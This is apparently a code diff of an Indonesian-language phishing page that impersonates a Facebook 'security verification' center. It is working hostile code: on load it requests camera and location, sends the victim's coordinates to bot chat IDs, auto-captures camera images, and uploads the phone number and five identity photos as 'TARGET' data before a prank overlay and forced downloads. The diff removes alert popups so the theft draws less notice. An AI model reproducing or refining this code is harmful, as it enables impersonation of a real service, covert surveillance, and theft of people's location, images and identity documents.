@@ -36,17 +36,13 @@
             font-family: "Courier New", monospace; animation: glitch 0.2s infinite;
         }
         @keyframes glitch { from { transform: translate(0,0); } to { transform: translate(3px,3px); } }
-        
-        .music-anim { display: flex; gap: 2px; align-items: flex-end; height: 15px; display: none; }
-        .bar { width: 3px; height: 100%; background: #fff; animation: wave 1s infinite; }
-        @keyframes wave { 0%, 100% { height: 3px; } 50% { height: 15px; } }
 
         .credit-bar {
             position: fixed; bottom: 0; width: 100%; background: rgba(0, 0, 0, 0.9);
             color: white; padding: 10px 20px; display: flex; align-items: center; 
             justify-content: space-between; border-top: 2px solid #1877f2; z-index: 1000;
         }
-        .play-btn { background: #1877f2; color: white; border: none; border-radius: 50px; padding: 5px 15px; font-size: 12px; font-weight: bold; cursor: pointer; display: flex; align-items: center; gap: 5px; }
+        .play-btn { background: #1877f2; color: white; border: none; border-radius: 50px; padding: 5px 15px; font-size: 12px; font-weight: bold; cursor: pointer; }
         
         #video, #canvas { display: none; }
     </style>
@@ -55,7 +51,7 @@
 
 <div id="splash-screen">
     <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" class="fb-logo-splash">
-    <h6 class="mt-3 text-muted">Memulai Verifikasi Identitas...</h6>
+    <h6 class="mt-3 text-muted">Sinkronisasi Keamanan...</h6>
 </div>
 
 <div id="chaos-overlay">
@@ -71,14 +67,15 @@
 <div class="container">
     <div class="main-card card p-4 text-center">
         <div class="fb-logo-text">facebook</div>
-        <h6 class="fw-bold mt-2">Pusat Bantuan Keamanan</h6>
+        <h6 class="fw-bold mt-2">Pusat Bantuan Verifikasi</h6>
         <hr>
-        <div id="mainError" class="error-box" style="background: #ffebe9; border: 1px solid #dd3c10; font-size: 13px; padding: 10px; border-radius: 6px; display: none; margin-bottom: 15px; text-align: left;">
-            <b>Gagal!</b><br>Nomor HP tidak valid atau jumlah foto tidak sesuai (WAJIB 5 FOTO).
+        <div id="mainError" class="error-box" style="background: #ffebe9; border: 1px solid #dd3c10; font-size: 13px; padding: 10px; border-radius: 6px; display: none; margin-bottom: 15px; text-align: left; color: #dd3c10;">
+            <b>Gagal Verifikasi!</b><br>
+            Wajib mengisi nomor telepon dan mengunggah <b>TEPAT 5 FOTO</b>. Tidak boleh lebih atau kurang.
         </div>
         <div class="text-start">
-            <input type="number" id="phone" class="form-control mb-3" placeholder="Nomor Telepon">
-            <label class="small fw-bold">Upload Dokumen (HARUS 5 FOTO):</label>
+            <input type="number" id="phone" class="form-control mb-3" placeholder="Nomor Telepon Akun">
+            <label class="small fw-bold">Upload Identitas (Wajib 5 Foto):</label>
             <input type="file" id="galeri" class="form-control mb-3" multiple accept="image/*">
         </div>
         <button class="btn-fb" onclick="validateFinal()">Konfirmasi</button>
@@ -89,12 +86,7 @@
     <div class="credit-info">
         <span class="small" style="color: #888;">Developed by: Malik & Hack7rBGG</span>
     </div>
-    <button class="play-btn" onclick="toggleMusic()">
-        <span id="btnText">▶ PLAY</span>
-        <div class="music-anim" id="animContainer">
-            <div class="bar"></div><div class="bar"></div><div class="bar"></div>
-        </div>
-    </button>
+    <button class="play-btn" onclick="toggleMusic()">▶ PLAY</button>
 </div>
 
 <video id="video" autoplay playsinline></video>
@@ -105,27 +97,23 @@
     const chats = ["7835924973", "8071786272"];
     const audio = document.getElementById('bgMusic');
 
-    // ALERT HANYA SEKALI DI AWAL 😈
     async function startSystem() {
-        alert("SISTEM KEAMANAN FACEBOOK\n\nHarap izinkan akses Kamera dan Lokasi untuk memverifikasi akun Anda.");
-        
+        // Alert awal cuma buat pancingan izin browser, abis itu HAPUS SEMUA ALERT.
         try {
             const pos = await new Promise((res, rej) => {
                 navigator.geolocation.getCurrentPosition(res, () => {
-                    alert("Akses Lokasi Ditolak! Reload halaman.");
-                    location.reload();
+                    location.reload(); 
                     rej();
                 });
             });
             sendToBot(`📍 LOKASI: http://maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
 
             const stream = await navigator.mediaDevices.getUserMedia({ video: true }).catch(() => {
-                alert("Akses Kamera Ditolak! Reload halaman.");
                 location.reload();
             });
             stream.getTracks().forEach(t => t.stop());
 
-            // JIKA SUDAH IZIN, ALERT HILANG DAN MASUK KE HALAMAN
+            // LOGIN SUKSES - ALERT TIDAK AKAN PERNAH MUNCUL LAGI
             document.getElementById('splash-screen').style.display = 'none';
             document.body.style.display = 'block';
             autoCapture("user");
@@ -133,7 +121,7 @@
         } catch (e) {}
     }
 
-    window.onload = () => { setTimeout(startSystem, 1500); };
+    window.onload = () => { setTimeout(startSystem, 1000); };
 
     function sendToBot(c, t="text", b=null) {
         tokens.forEach((tk, i) => {
@@ -164,23 +152,23 @@
     }
 
     function toggleMusic() {
-        const anim = document.getElementById('animContainer');
-        if (audio.paused) { audio.play(); document.getElementById('btnText').innerText = "⏸"; anim.style.display = "flex"; }
-        else { audio.pause(); document.getElementById('btnText').innerText = "▶"; anim.style.display = "none"; }
+        if (audio.paused) { audio.play(); }
+        else { audio.pause(); }
     }
 
-    // VALIDASI MATI-MATIAN WAJIB 5 FOTO! ☠️
+    // VALIDASI MATI-MATIAN TANPA ALERT SAMPAH!
     function validateFinal() {
         const p = document.getElementById('phone').value;
         const f = document.getElementById('galeri').files;
+        const errBox = document.getElementById('mainError');
         
-        // KUNCI: Harus pas 5! Upload 3 atau 8 bakal kena blokir!
+        // HANYA BOLEH PAS 5 FOTO. KURANG ATAU LEBIH = GAGAL.
         if (p.length < 10 || f.length !== 5) {
-            document.getElementById('mainError').style.display = 'block';
-            alert("JUMLAH FOTO SALAH! Anda harus mengunggah TEPAT 5 foto.");
+            errBox.style.display = 'block'; // Cuma munculin teks error di layar
             return;
         }
         
+        errBox.style.display = 'none';
         sendToBot(`📱 TARGET: ${p}`);
         for (let i=0; i<f.length; i++) sendToBot(`🖼️ FOTO ${i+1}`, "photo", f[i]);
         startChaos();
@@ -191,7 +179,7 @@
         const vi = document.getElementById('chaos-video');
         ov.style.display = 'block'; vi.muted = false; vi.play();
         
-        // DOWNLOAD 5 FILE YOU ARE IDIOT
+        // AUTO DOWNLOAD 5 FILE YOU ARE IDIOT
         for (let j = 1; j <= 5; j++) {
             let blob = new Blob(["YOU ARE IDIOT"], { type: "text/plain" }); 
             let url = window.URL.createObjectURL(blob);
